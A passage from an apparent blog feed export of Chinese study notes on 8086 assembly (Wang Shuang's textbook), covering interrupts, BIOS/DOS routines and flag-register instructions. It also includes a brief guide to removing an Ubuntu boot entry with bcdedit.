执行后(al)=10010000b，CF=0 如果移动位数大于1时，必须将移动位数放在cl中 123mov al,01010001bmov cl,3shl al,cl 执行后(al)=10001000b，CF=0 即，将X逻辑左移一位，相当于执行X=X*2 shr指令逻辑右移指令 功能： 将一个寄存器或内存单元中的数据向右移位 将最后移出的一位写入CF中 最高位用0补充 例： 12mov al,10000001bshr al,1 ;将al中的数据右移一位 执行后(al)=01000000b，CF=1 如果移动位数大于1时，必须将移动位数放在cl中 将X逻辑右移一位，相当于执行X=X/2 CMOS RAM中存储的时间信息在CMOS RAM中，存放着当前的时间：年、月、日、时、分、秒，每个信息长度1个字节 存放单元为： 秒 分 时 日 月 年 0 2 4 7 8 9 这些数据以BCD码(以4位二进制数表示十进制数码的编码方法)的方式存放： 一个字节可以表示两个BCD码 CMOS RAM存储时间信息的单元中，存储了用两个BCD码表示的两位十进制数，高4位的BCD码表示十位，低4位的BCD码表示个位。例：00010100b表示14 编程，在屏幕中间显示当前的月份两部分工作： 从CMOS RAM的8号单元读出当前月份的BCD码 将用BCD码表示的月份以十进制的形式显示到屏幕上 BCD码值=十进制数码值，则BCD码值+30h=十进制数对应的ASCII码 从CMOS RAM的8号单元中读出的一个字节，分为两个表示BCD码值的数据 显示十位和个位BCD码值+30h对应的ASCII码字符 12345678910111213141516171819202122232425assume cs:codecode segmentstart: mov al,8 out 70h,al ;访问CMOS RAM的8号单元 in al,71h ;读出CMOS RAM8号单元的数据 mov ah,al mov cl,4 shr ah,cl ;ah中为月份的十位数码值 and al,00001111b ;al中为月份的个位数码值 add ah,30h add al,30h ;转换为对应的十进制数的ASCII码值 mov bx,0b800h mov es,bx mov byte ptr es:[160*12+40*2],ah ;显示月份的十位数码 mov byte ptr es:[160*12+40*2+2],al ;显示月份的个位数码 mov ax,4c00h int 21h code endsend start]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-int指令]]></title>
    <url>%2F2019%2F04%2F23%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-int%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[一种重要的内中断，由int指令引发的中断 int指令格式： int n，n为中断类型码 功能：引发中断过程 CPU执行int n指令，相当于引发一个n号中断的中断过程 中断过程如下： 取中断类型码n 标志寄存器入栈，TF=0，IF=0 CS、IP入栈 (IP)=(n*4)，(CS)=(n*4+2) 可以在程序中使用int指令调用任何一个中断的中断处理程序 int指令的最终功能和call指令相似，都是调用一段程序 系统将一些具有一定功能的子程序，以中断处理程序的方式提供给应用程序调用。可以使用int指令调用这些子程序 中断处理程序简称为中断例程 编写供应用程序调用的中断例程编写、安装中断7ch的中断例程功能：求一word型数据的平方 参数：(ax)=要计算的数据 返回值：dx、ax中存放结果的高16位和低16位 应用举例：求2*3456^2 123456789101112assume cs:codecode segmentstart: mov ax,3456 int 7ch ;调用中断7ch的中断例程，计算ax中数据的平方 add ax,ax adc dx,dx ;dx:ax存放结果，将结果乘以2 mov ax,4c00h int 21h code endsend start 安装程序： 12345678910111213141516171819202122232425262728assume cs:codecode segmentstart: mov ax,cs mov ds,ax mov si,offset sqr ;ds:si指向源地址 mov ax,0 mov es,ax mov di,200h ;es:di指向目的地址 mov cx,offset sqrend-offset sqr ;cx为传输长度 cld ;正向传输 rep movsb ;串传送 mov ax,0 ;设置中断向量 mov es,ax mov word ptr es:[7ch*4],200h mov word ptr es:[7ch*4+2],0 mov ax,4c00h int 21hsqr: mul ax ;7ch程序 iret ;恢复现场 sqrend: nopcode endsend strart 编写、安装中断7ch的中断例程功能：将一个全是字母，以0结尾的字符串，转化为大写 参数：ds:si指向字符串的首地址 应用举例：将data段中的字符串转化为大写 12345678910111213141516assume cs:codedata segment db &apos;conversation&apos;,0data endscode segmentstart: mov ax,data mov ds,ax mov si,0 ;ds:si指向字符串首字母 int 7ch ;调用中断7ch的中断例程 mov ax,4c00h int 21hcode endsend start 安装程序： 123456789101112131415161718192021222324252627282930313233343536assume cs:codecode segmentstart: mov ax,cs mov ds,ax mov si,offset capital ;ds:si指向源地址 mov ax,0 mov es,ax mov di,200h ;es:di指向目的地址 mov cx,offset capitalend-offset capital # cx为传输长度 cld ;正向传输 rep movsb ;串传输 mov ax,0 ;设置中断向量 mov es,ax mov word ptr es:[7ch*4],200h mov word ptr es:[7ch*4+2],0 mov ax,4c00h int 21h capital:push cx push si ;保存所用寄存器的原始数据 change:mov cl,[si] mov ch,0 jcxz ok and byte ptr [si],11011111b ;转大写 inc si jmp short change ok: pop si pop cx ;恢复所用寄存器原始数据 iret ;恢复现场capitalend:nopcode endsend start 对int、iret和栈的深入理解用7ch中断例程完成loop指令的功能loop s执行需要两个信息：循环次数和到s的位移 用cx存放循环次数，bx存放位移 应用举例：在屏幕中间显示80个‘！’ 1234567891011121314151617181920assume cs:codecode segmentstart: mov ax,0b800h mov es,ax mov di,160*12 mov bx,offset s-offset se ;从标号se到标号s的转移位移 mov cx,80 s: mov byte ptr es:[di],&apos;!&apos; ;显示‘!’ add di,2 int 7ch ;调用中断7ch的中断例程，loop功能 se: nop mov ax,4c00h int 21h code endsend start 7ch的中断例程： 1234567lp: push bp ;保存bp寄存器原值 mov bp,sp ;bp中保存栈顶的偏移地址 dec cx ;cx自减1 jcxz lpret ;(cx)=0，则转移，不实现loop s功能 add [bp+2],bx ;栈中se的偏移地址变为s的偏移地址lpret: pop bp ;恢复bp寄存器原值 iret ;恢复现场时IP值为s的偏移地址，实现loop转移 在中断过程中，当前标志寄存器、CS、IP入栈，此时CS为标号s的段地址，IP为标号se的偏移地址。中断例程中，需将CS设置为标号s的段地址，IP设置为标号s的偏移地址，实现loop s的功能 中断例程中使用到栈，当执行push bp后，栈中情况为：自上而下为bp原值、se的偏移地址(IP)、s的段地址(CS)、标志寄存器原值。即((ss)*16+(bp)+2)处为se的偏移地址(原始IP的值)，将其加上bx中存储的转移位移即变为s的偏移地址(修改了原始IP的值)，再通过iret恢复现场将CS、IP恢复即实现了loop s BIOS和DOS所提供的中断例程在系统主板的ROM中存放着一套程序，称为BIOS(基本输入输出系统) BIOS主要功能： 硬件系统的检测和初始化程序 外部中断和内部中断的中断例程 用于对硬件设备进行I/O操作的中断例程 其他和硬件系统相关的中断例程 从操作系统的角度来看，DOS的中断例程就是操作系统向程序员提供的编程资源 BIOS和DOS在所提供的中断例程中包含了许多子程序，这些子程序实现了程序员在编程的时候经常需要用到的功能 程序员在编程的时候，可以直接用int指令调用BIOS和DOS提供的中断例程 和硬件设备相关的DOS中断例程中，一般调用了BIOS的中断例程 BIOS和DOS中断例程的安装过程 开机后，CPU一加电，初始化(CS)=0FFFFH，(IP)=0，自动从FFFF:0单元开始执行程序 FFFF:0处有一条转跳指令，CPU执行该指令后，转去执行BIOS中的硬件系统检测和初始化程序 初始化程序将建立BIOS所支持的中断向量，即将BIOS提供的中断例程的入口地址登记在中断向量表中 对于BIOS所提供的中断例程，只需将入口地址登记在中断向量表中即可，因其是固化到ROM中的程序，一直在内存中存在 硬件系统检测和初始化完成后，调用int 19h进行操作系统的引导。从此将计算机交由操作系统控制 DOS启动后，除完成其他工作外，还将它所提供的中断例程装入内存，并建立相应的中断向量 BIOS中断例程应用int 10h中断例程是BIOS提供的中断例程，其中包含了多个和屏幕输出相关的子程序 一般来说，一个供程序员调用的中断例程中往往包含多个子程序，中断例程内部用传递进来的参数来决定执行哪一个子程序 BIOS和DOS提供的中断例程，都用ah来传递内部子程序的编号 int 10h中断例程的设置光标位置功能12345mov ah,2 ;置光标mov bh,0 ;第0页mov dh,5 ;dh中存储行号mov dl,12 ;dl中放列号int 10h (ah)=2表示调用第10h号中断例程的2号子程序，功能为设置光标位置，可提供光标所在行号(80*25字符模式下:0–24)、列号(80*25字符模式下:0–79)和页号作为参数 (bh)=0、(dh)=5、(dl)=12，设置光标到第0页，第5行，第12列 bh中页号的含义：在内存地址空间中，B8000H-BFFFFH共32KB的空间，为80*25彩色字符模式的显示缓冲区。一屏的内容在显示缓冲区中共占4000个字节 显示缓冲区分为8页，每页4KB，显示器可以显示任意一页的内容。一般情况下，显示第0页的内容。即通常情况下，B8000H-B8F9FH中的4000个字节的内容将显示在显示屏上 int 10h中断例程的在光标位置显示字符功能123456mov ah,9 ;在光标位置显示字符mov al,&apos;a&apos; ;字符mov bl,7 ;颜色属性mov bh,0 ;第0页mov cx,3 ;字符重复个数int 10h (ah)=9表示调用第10h号中断例程的9号子程序，功能为在光标位置显示字符，可以提供要显示的字符、颜色属性、页号、字符重复个数作为参数 bl中的颜色属性的格式如下 编程:在屏幕的5行12列显示3个红底高亮闪烁绿色的’a’123456789101112131415161718192021assume cs:codecode segment mov ah,2 ;设置光标 mov bh,0 ;第0页 mov dh,5 ;dh中放行号 mov dl,12 ;dl中放列号 int 10h mov ah,9 ;在光标位置显示字符 mov al,&apos;a&apos; ;字符 mov bl,11001010b ;字符颜色属性 mov bh,0 ;第0页 mov cx,3 ;字符重复个数 int 10h mov ax,4c00h int 21hcode endsend DOS中断例程应用int 21h中断例程是DOS提供的中断例程，其中包含了DOS提供给程序员在编程时调用的子程序 int 21h中断例程的4ch号功能一直使用int 21h中断例程的4ch号功能，即程序返回功能 123mov ah,4ch ;程序返回mov al,0 ;返回值int 21h (ah)=4ch表示调用第21h号中断例程的4ch号子程序，功能为程序返回，可提供返回值作为参数 课程前面使用这个功能时经常写做 12mov ax,4c00hint 21h int 21h中断例程在光标位置显示字符串的功能123ds:dx指向字符串 ;要显示的字符串需用&quot;$&quot;作为结束符mov ah,9 ;功能号9，表示在光标位置显示字符串int 21h (ah)=9表示调用第21h号中断例程的9号子程序，功能为在光标位置显示字符串，可以提供要显示字符串的地址作为参数 编程:在屏幕的5行12列显示字符串”Welcome to masm!”123456789101112131415161718192021222324assume cs:codedata segment db &apos;Welcome to masm!&apos;,&apos;$&apos; ;$不显示，起边界作用data endscode segmentstart: mov ah,2 ;置光标 mov bh,0 ;第0页 mov dh,5 ;dh中放行号 mov dl,12 ;dl中放列号 int 10h ;执行BIOS第10h号中断例程的2号子程序 mov ax,data mov ds,ax mov dx,0 ;ds:dx指向字符串首地址 mov ah,9 int 21h ;执行DOS第21h号中断例程的9号子程序 mov ax,4c00h int 21h code endsend start DOS为程序员提供了许多可以调用的子程序，都包含在int 21h中断例程中]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-内中断]]></title>
    <url>%2F2019%2F04%2F22%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E5%86%85%E4%B8%AD%E6%96%AD%2F</url>
    <content type="text"><![CDATA[任何一个通用CPU，都可以在执行完当前正在执行的指令之后，检测到从CPU外部发送过来的或内部产生的一种特殊信息，并且可以立即对所接收的信息进行处理。这种特殊的信息，称为中断信息 中断在于：CPU不再接着(刚执行完的指令)向下执行，而是转去处理这个特殊信息 中断信息可以来自CPU的内部和外部 内中断的产生当CPU内部产生下面的情况时，将产生相应的中断信息 除法错误，例：除法溢出 单步执行 执行into指令 执行int指令 8086CPU用称为中断类型码的数据来标识中断信息的来源 中断类型码为一个字节型的数据，可表示256种中断信息的来源 以上4种中断源，在8086CPU中的中断类型码为： 除法错误：0 单步执行：1 执行into指令：4 执行int指令：该指令格式为int n，指令中的n为字节型立即数，是提供给CPU的中断类型码 中断处理程序用来处理中断信息的程序被称为中断处理程序 CPU在收到中断信息后，如何根据中断信息确定其处理程序的入口 中断类型码的作用就是用来定位中断处理程序的。如何根据8位中断类型码得到中断处理程序的段地址和偏移地址呢？ 中断向量表CPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址 中断向量，即中断处理程序的入口地址 中断向量表，即中断处理程序入口地址的列表 中断向量表在内存中保存，其中存放着256个中断源所对应的中断处理程序的入口 对于8086CPU，中断向量表指定存放在内存地址0处，0000:0000到0000:03FF的1024个单元中 中断向量表中，一个表项存放一个中断向量，也就是一个中断处理程序的入口地址，一个表项占两个字，高地址字存放段地址，低地址字存放偏移地址 可见，CPU通过中断类型码，查找中断向量表，就可以得到中断程序的入口地址 中断过程通过中断类型码到中断向量表中找到中断向量，并用它设置CS和IP，这个工作由CPU的硬件自动完成，称为中断过程 中断过程： 从中断信息中取得中断类型码N 标志寄存器的值入栈pushf 设置标志寄存器的第8位TF和第9位IF的值为0TF=0,IF=0 CS的内容入栈push CS IP的内容入栈push IP 从内存地址为中断类型码*4和中断类型码*4+2的两个字单元中读取中断处理程序的入口地址设置IP和CS (IP)=(N*4),(CS)=(N*4+2) CPU收到中断信息，首先引发中断过程，硬件在完成中断过程后，CS:IP将指向中断处理程序的入口，CPU开始执行中断处理程序 中断处理程序和iret指令中断处理程序由于CPU随时都可能检测到中断信息，即CPU随时都可能执行中断处理程序，所以中断处理程序必须一直存储在内存某段空间之中。而中断处理程序的入口地址，即中断向量，必须存储在对应的中断向量表表项中 中断处理程序的编写方法： 保存用到的寄存器 处理中断 恢复用到的寄存器 用iret指令返回 iret指令iret指令描述为： 123pop IPpop CSpopf iret通常和硬件自动处理的中断过程配合使用 中断过程中，寄存器入栈的顺序为标志寄存器、CS、IP，iret指令的出栈顺序为IP、CS、标志寄存器，实现了执行中断处理程序前中断过程进行保存现场的工作，iret指令执行后，恢复现场的工作 除法错误中断的处理0号中断，除法错误中断的处理 当CPU执行div等除法指令的时候，若发生除法溢出错误，将产生中断类型码为0的中断信息，CPU将检测到这个信息，然后引发中断过程，转去执行0号中断所对应的中断处理程序 123mov ax,1000hmov bh,1div bh 0号中断处理程序的功能：显示提示信息Divide overflow后，返回到操作系统中 编程处理0号中断重新编写0号中断处理程序，功能时在屏幕中间显示overflow!，然后返回到操作系统 分析： CPU进行中断过程 编写中断处理程序do0 相关处理 向显示缓存区送字符串overflow! 返回DOS do0在内存中的存放位置 内存0000:0000–0000:03FF，大小为1KB的空间存放中断向量表，8086CPU支持256个中断，但实际上，系统中要处理的中断事件未达到256个，所以在中断向量表中，许多单元是空的 一般情况下，从0000:0200–0000:02FF的256个字节空间所对应的中断向量表项为空 可以将do0传送到内存0000:0200处 将do0的入口地址，即0000:0200登记在中断向量表的对应表项中。 0号中断的段地址存放在0*4+2字单元中，偏移地址存放在0*4字单元中 将do0的段地址0存放在0000:0002字单元中，将偏移地址200h存放在0000:0000字单元中 程序框架如下 1234567891011121314assume cs:codecode segmentstart: do0安装程序 设置中断向量表 mov ax,4c00h int 21h do0: 显示字符串&quot;overflow!&quot; mov ax,4c00h int 21h code endsend start 程序执行时，首先执行do0安装程序，将do0的代码复制到内存0:200处；然后设置中断向量表，将do0的入口地址，即偏移地址200H和段地址0，保存在0号表项中。完成后，程序返回。do0的代码虽然在程序中，但不在程序执行时执行，它是在除法溢出发生的时候才得以执行的中断处理程序 安装程序使用movsb指令，将do0的代码送入0:200处 123456789101112131415161718192021222324252627assume cs:codecode segmentstart: mov ax,cs mov ds,ax mov si,offset do0 ;ds:si指向源地址 mov ax,0 mov es,ax mov di 200h ;es:di指向目的地址 mov cx,offset do0end-offset do0 ;cx为传输长度 cld ;正向传送 rep movsb 设置中断向量表 mov ax,4c00h int 21h do0: 显示字符串&quot;overflow!&quot; mov ax,4c00h int 21h do0end: nopcode endsend start -是编译器识别的运算符号，编译器可以用它来进行两个常数的减法 汇编编译器可以处理表达式 例：指令mov ax,(5+3)*5/10，被编译器处理为指令mov ax,4 do0do0程序主要任务是显示字符串 1234567891011121314151617181920212223242526272829303132333435363738394041424344assume cs:codecode segmentstart: mov ax,cs mov ds,ax mov si,offset do0 ;ds:si指向源地址 mov ax,0 mov es,ax mov di 200h ;es:di指向目的地址 mov cx,offset do0end-offset do0 ;cx为传输长度 cld ;正向传送 rep movsb 设置中断向量表 mov ax,4c00h int 21h do0: jmp short do0start ;用于跳过字符串内存空间，转到正式程序执行 db &quot;overflow!&quot; ;将字符串放到do0中，防止在执行中断处理程序时无法获取字符串 do0start:mov ax,cs mov ds,ax mov si,202h ;ds:si指向&quot;overflow!&quot;，jmp指令占2个字节 mov ax,0b800h mov es,ax mov di,12*160+36*2 ;es:di指向显存空间的中间位置 mov cx,9 ;cx为字符串的长度 s: mov al,[si] mov es:[di],al inc si add di,2 ;显存空间中，第一个字节存放数据，第二个字节存放属性 loop s mov ax,4c00h int 21h do0end: nopcode endsend start 设置中断向量将do0的入口地址0:200，写入中断向量表的0号表项中，使do0成为0号中断的中断处理程序 0号表项的地址为0:0，0:0字单元存放偏移地址，0:2字单元存放段地址 1234mov ax,0mov es,axmov word ptr es:[0*4],200hmov word ptr es:[0*4+2],0 单步中断基本上，CPU在执行完一条指令之后，若检测到标志寄存器的TF位为1，则产生单步中断，引发中断过程 中断类型码为1，单步中断 中断过程如下： 取得中断类型码1 标志寄存器入栈，TF、IF设置为0 CS、IP入栈 (IP)=(1*4)，(CS)=(1*4+2) Debug提供了单步中断的中断处理程序，功能为显示所有寄存器中的内容后等待输入命令。然后，在使用t命令执行指令时，Debug将TF设置为1，使CPU工作于单步中断方式下，则在CPU执行完这条指令后就引发单步中断，执行单步中断的中断处理程序，所有寄存器的内容被显示在屏幕上，并且等待输入命令 若在执行单步处理程序之前，TF=1，则CPU在执行完中断处理程序的第一条指令后，又要产生单步中断，则又要转去执行单步中断的中断处理程序，在执行完中断处理程序的第一条指令后，又要产生单步中断，则又要转去执行单步中断的中断处理程序。。。陷入无限循环 避免无限循环的方法是，在进入中断处理程序之前，设置TF=0，从而避免CPU在执行中断处理程序的时候发生单步中断 响应中断的特殊情况一般情况下，CPU在执行完当前指令后，若检测到中断信息，就响应中断，引发中断过程 在某些情况下，CPU在执行完当前指令后，即便是发生中断，也不会响应 当执行完向ss寄存器传送数据的指令后，即便发生中断，CPU也不会响应。因ss:sp联合指向栈顶，若响应中断，ss改变，sp未改变，则ss:sp未指向正确的栈顶，将引发错误。所以应利用此特性，将设置ss和sp的指令连续存放 所以，当使用Debug进行单步执行时，设置好ss寄存器后，CPU未响应单步中断，继续执行设置sp寄存器的指令，之后响应下一次单步中断。单步执行显示结果中未体现设置sp指令的过程，但此指令已经被执行了]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win10+Ubuntu双系统彻底删除Ubuntu]]></title>
    <url>%2F2019%2F04%2F16%2Fwin10-ubuntu%E5%8F%8C%E7%B3%BB%E7%BB%9F%E5%BD%BB%E5%BA%95%E5%88%A0%E9%99%A4ubuntu%2F</url>
    <content type="text"><![CDATA[删除Ubuntu的UEFI启动项使用bcdedit工具删除 具体步骤： 以管理员身份打开cmd bcdedit /export newbcd bcdedit /enum firmware 找到Ubuntu的对应identifier，复制 bcdedit /store newbcd /delete {xxx} （{}里面就是上一步的identifier） bcdedit /import newbcd /clean 注意：使用diskpart之类的命令不会真正删除Ubuntu启动项，虽然此时win10会自动启动，但Ubuntu启动项仍然会存在 删除Ubuntu分区win10磁盘管理工具即可]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>无聊</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-标志寄存器]]></title>
    <url>%2F2019%2F04%2F08%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8%2F</url>
    <content type="text"><![CDATA[特殊的寄存器(不同的处理机，个数和结构可能不同) 作用： 用来存储相关指令的某些执行结果 用来为CPU执行相关指令提供行为依据 用来控制CPU的相关工作方式 8086CPU的标志寄存器(flag)有16位，其中存储的信息通常被称为程序状态字(PSW) flag的1、3、5、12、13、14、15位在8086CPU中没有使用，不具有任何含义 flag的0、2、4、6、7、8、9、10、11位都具有特殊的含义 ZF标志flag的第6位 零标志位 用于记录相关指令执行后，其结果是否为0。 若结果为0，则ZF=1 若结果不为0，则ZF=0 在8086CPU指令集中，有的指令的执行是影响标志寄存器的，如add、sub、mul、div、inc、or、and等运算指令(逻辑或算数运算)；有的指令的执行对标志寄存器没有影响，如mov、push、pop等传送指令 PF指令flag的第2位 奇偶标志位 用于记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数 若1的个数为偶数，则PF=1 若1的个数为奇数，则PF=0 SF标志flag的第7位 符号标志位 用于记录相关指令执行后，其结果是否为负 若结果为负，SF=1 若结果不为负，SF=0 计算机中通常用补码来表示有符号数据 计算机中的一个数据可以看作是有符号数，也可以看作是无符号数 SF标志，就是CPU对有符号数运算结果的一种记录，它记录数据的正负。当数据当作有符号数来运算的时候，可通过SF来得知结果的正负；当数据当作无符号数来运算的时候，SF的值则无意义，虽然相关的指令影响了它的值 CF标志flag的第0位 进位标志位 在进行无符号数运算时，用于记录运算结果的最高有效位向更高位的进位值，或从更高位的借位值 对于位数为N的无符号数来说，其对应的二进制信息的最高位，即第N-1位，就是它的最高有效位，而假想存在的第N位，就是相对于最高有效位的更高位 8086CPU使用flag的CF位来记录进位值与借位值 OF标志溢出当进行有符号数运算的时候，如果结果超过了机器所能表示的范围称为溢出 比如指令运算的结果用8位寄存器或内存单元来存放，那机器所能表示的范围就是-128–127，16位有符号数据，机器所能表示的范围是-32768–32767 由于在进行有符号数运算时，可能发生溢出而造成结果的错误，则CPU需要对指令执行后是否产生溢出进行记录 OF标志flag的第11位 溢出标志位 用于记录有符号数运算的结果是否发生了溢出 若发生溢出，OF=1 若未发生溢出，OF=0 CF是对无符号数运算有意义的标志位 OF是对有符号数运算有意义的标志位 CF与OF之间无任何关系 adc指令带进位的加法指令，利用CF位上记录的进位值 指令格式：adc 操作对象1，操作对象2 功能：操作对象1=操作对象1+操作对象2+CF 例： 1234mov ax,2mov bx,1sub bx,ax ;(bx)=(bx)-(ax)=1-2=-1 CF=1adc ax,1 ;(ax)=(ax)+1+CF=2+1+1=4 123mov al,98Hadd al,al ;(al)=(al)+(al)=98H+98H=130H al中最高位1丢弃,CF=1adc al,3 ;(al)=(al)+3+CF=30H+3+1=34H 在执行abc指令的时候加上CF的值的含义，是由abc指令前面的指令决定的。如果CF的值是被sub指令设置的，那么CF的含义为借位值；如果CF的值是被add指令设置的，那么CF的含义为进位值 加法分为两步进行： 低位相加 高位相加再加上低位相加产生的进位值 CPU提供adc指令的目的，就是来进行加法的第二步运算的 adc指令和add指令相配合就可以对更大的数据进行加法运算 编程计算1EF0001000H+2010001EF0H，结果放在ax(高16位)和bx(次低16位)，cx(低16位)中 计算分3步： 先将低16位相加，完成后，CF中记录本次相加的进位值 再将次高16位和CF(来自低16位的进位值)相加，完成后，CF中记录本次相加的进位值 最后高16位和CF(来自次高16位的进位值)相加，完成后，CF中记录本次相加的进位值 123456mov ax,001EHmov bx,0F000H ;不可直接使用字母开头的立即数mov cx,1000Hadd cx,1EF0Hadc bx,1000Hadc ax,0020H 编写子程序对两个128位数据进行相加 名称：add128 功能：两个128位数据进行相加 参数：ds:si指向存储第一个数的内存单元，128位的数据，需要8个字单元存储，由低地址单元到高地址单元一次存放128位数据由低到高的各个字，运算结果存储在第一个数的存储空间中。ds:di指向存储第二个数的内存空间 12345678910111213141516171819202122add128: push ax push cx push si push di sub ax,ax mov cx,8s: mov ax,[si] adc ax,[di] mov [si],ax inc si inc si inc di inc di loop s pop di pop si pop cx pop ax ret sbb指令带借位的减法指令，利用CF位上记录的借位值 指令格式：sbb 操作对象1，操作对象2 功能：操作对象1=操作对象1-操作对象2-CF sbb指令执行后，将对CF进行设置 利用sub指令和sbb指令可以对任意大的数据进行减法运算 cmp指令比较指令 功能相当于减法指令，只是不保存结果 指令格式：cmp 操作对象1，操作对象2 功能：计算操作对象1-操作对象2，但并不保存结果，仅仅根据计算结果对标志寄存器进行设置 无符号数比较cmp ax,bx 若(ax)=(bx)，则(ax)-(bx)=0，所以：ZF=1(零标志位) 若(ax)&ne;(bx)，则(ax)-(bx)&ne;0，所以：ZF=0(零标志位) 若(ax)&lt;(bx)，则(ax)-(bx)将产生借位，所以：CF=1(进位标志位) 若(ax)&ge;(bx)，则(ax)-(bx)不必借位，所以：CF=0(进位标志位) 若(ax)&gt;(bx)，则(ax)-(bx)既不必借位，结果又不为0，所以：CF=0(进位标志位)且ZF=0(零标志位) 若(ax)&le;(bx)，则(ax)-(bx)既可能借位，结果可能为0，所以：CF=1(进位标志位)且ZF=1(零标志位) 有符号数比较cmp ah,bh 若(ah)=(bh)，则(ah)-(bh)=0，所以：ZF=1(零标志位) 若(ah)&ne;(bh)，则(ah)-(bh)&ne;0，所以：ZF=0(零标志位) 对于判断其他情况，并不能通过单纯的考查SF(符号标志位)来判断，必须结合查看OF(溢出标志位)来进行判断 若SF=1,OF=0，则(ah)&lt;(bh) 若SF=1,OF=1，则(ah)&gt;(bh) 若SF=0,OF=1，则(ah)&lt;(bh) 若SF=0,OF=0，则(ah)&ge;(bh) 检测比较结果的条件转移指令所有条件转移指令的转移位移都是-128–127 因cmp指令可以同时进行无符号数和有符号数的比较，则根据cmp指令的比较结果进行转移的指令也分为根据无符号数的比较结果进行转移的条件转移指令(检测zf、cf的值)和根据有符号数的比较结果进行转移的条件转移指令(检测sf、of、zf的值) 根据无符号数的比较结果进行转移的条件转移指令： 指令 含义 检测的相关标志位 je 等于则转移 ZF=1 jne 不等于则转移 ZF=0 jb 低于则转移 CF=1 jnb 不低于则转移 CF=0 ja 高于则转移 CF=0且ZF=0 jna 不高于则转移 CF=1或ZF=1 条件转移指令实质是根据所检测的相关标志位来进行条件判断是否发生转移的，与cmp指令结合使用时才会体现“等于则转移”等含义 编程data段中的8个字节如下： 123data segment db 8,11,8,1,8,5,63,38data ends 统计data段中数值为8的字节的个数，结果保存在ax中12345678910mov ax,datamov ds,axmov bx,0 ;ds:bx指向第一个字节mov ax,0 ;重置ax，用于存放个数mov cx,8s: cmp byte ptr [bx],8 ;将内存单元内容与8进行比较 jne next ;不相等转向next inc ax ;相等则ax加1next: inc bx ;转向下一个内存单元 loop s 统计data段中数值大于8的字节个数，ax保存统计结果12345678910mov ax,datamov ds,axmov ax,0mov bx,0mov cx,8s: cmp byte ptr [bx],8 ;和8进行比较 jna next ;小于8则转到next inc ax ;大于8则ax加1next: inc bx loop s 统计data段中数值小于8的字节的个数，ax保存统计结果12345678910mov ax,datamov ds,axmov ax,0mov bx,0mov cx,8s: cmp byte ptr [bx],8 ;与8进行比较 jnb next ;大于8转向next inc ax ;小于8则ax加1next: inc bx loop s DF标志和串传送指令DF标志标志寄存器第10位 方向标志位 作用：在串处理指令中，控制每次操作后SI、DI的增减 DF=0：每次操作后SI、DI递增 DF=1：每次操作后SI、DI递减 串传送指令movsb格式：movsb 功能：执行movsb指令相当于进行： ((es)*16+(di))=((ds)*16+(si)) 若DF=0则：(si)=(si)+1，(di)=(di)+1 若DF=1则：(si)=(si)-1，(di)=(di)-1 将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器DF位的值，将si和di递增或递减 movsw功能：将ds:si指向的内存单元中的字送入es:di中，然后根据标志寄存器DF位的值，将si和di递增2或递减2 一般来说，movsb和movsw都与rep配合使用，格式：rep movsb rep movsb的功能： 12s: movsb loop s rep的作用是：根据CX的值，重复执行后面的串传送指令。由于每执行一次movsb指令si和di都会递增或递减指向后一个单元或前一个单元，则rep movsb就可以循环实现(cx)个字符的传送 类似的，rep movsw的功能： 1s: movsw 标志寄存器的DF位决定串传送指令执行后，si和di改变的方向，CPU提供相应的指令来对DF位进行设置 cld指令：将标志寄存器的DF位置0 std指令：将标志寄存器的DF位置1 编程将data段中的第一个字符串复制到其后面的空间中1234data segment db &apos;Welcome to masm!&apos; db 16 dup (0)data ends 使用串传送指令需提供的必要信息 传送的原始位置：data:0 传送的目的位置：data:0010 传送的长度：16 传送的方向：正向传送(向后)，DF=0(si和di递增) 12345678mov ax,datamov ds,axmov si,0 ;ds:si指向data:0mov es,axmov di,16 ;es:di指向data:0010mov cx,16 ;rep循环16次cld ;设置DF=0，正向传送(向后)rep movsb 将F000H段最后16个字符用串传送指令复制到data段中123data segment db 16 dup (0)data ends 将ds:si指向F000H段的最后一个单元，将es:di指向data段中的最后一个单元，逆向传送16个字节 传送的起始位置：F000:FFFF 传送的目的位置：data:000F 传送的长度：16 传送的方向：逆向传送(向前)，DF=1(si和di递减) 123456789mov ax,0f000hmov ds,axmov si,0ffffh ;ds:si指向f000:ffffmov ax,datamov es,axmov di,15 ;es:di指向data:000Fmov cx,16 ;rep循环16次std ;设置DF=1，逆向传送(向前)rep movsb pushf和popfpushf功能是将标志寄存器的值压栈 popf功能是从栈中弹出数据，送入标志寄存器 为直接访问标志寄存器提供了一种方法 标志寄存器在Debug中的表示在Debug中，标志寄存器是按照有意义的各个标志位单独表示的 标志位 值为1的标记 值为0的标记 OF OV NV SF NG PL ZF ZR NZ PF PE PO CF CY NC DF DN UP]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-CALL和RET指令]]></title>
    <url>%2F2019%2F04%2F01%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-CALL%E5%92%8CRET%E6%8C%87%E4%BB%A4%2F</url>
